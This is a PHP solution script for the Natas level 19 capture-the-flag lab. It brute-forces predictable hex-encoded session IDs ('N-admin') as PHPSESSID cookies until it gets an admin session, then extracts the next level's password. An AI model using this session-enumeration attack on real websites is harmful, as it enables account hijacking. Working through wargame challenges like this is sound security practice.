<?php

require_once dirname(__DIR__) . '/bootstrap.php';

use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Cookie\setCookie;

$level = 19;
$username = 'natas' . $level;
$password = readFlag($level - 1);
$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$i = 0;
do {
    $session = sprintf('%d-%s', $i++, 'admin');
    print 'Trying ' . $session . "\n";

    $jar = new CookieJar();
    $jar->setCookie(new SetCookie([
        'Name' => 'PHPSESSID',
        'Value' => bin2hex($session),
        'Domain' => 'natas19.natas.labs.overthewire.org',
    ]));

    $response = $client->request('POST', $url, [
        'auth' => [$username, $password],
        'form_params' => [
            'username' => 'admin',
            'password' => 'something',
        ],
        'cookies' => $jar
    ]);

    $body = (string)$response->getBody();

} while (preg_match('/You are logged in as a regular user/', $body) && $i <= 640);

preg_match('/Password: (.*)<\/pre>/', $body, $flag);
echo "\n";
echo $flag[1];
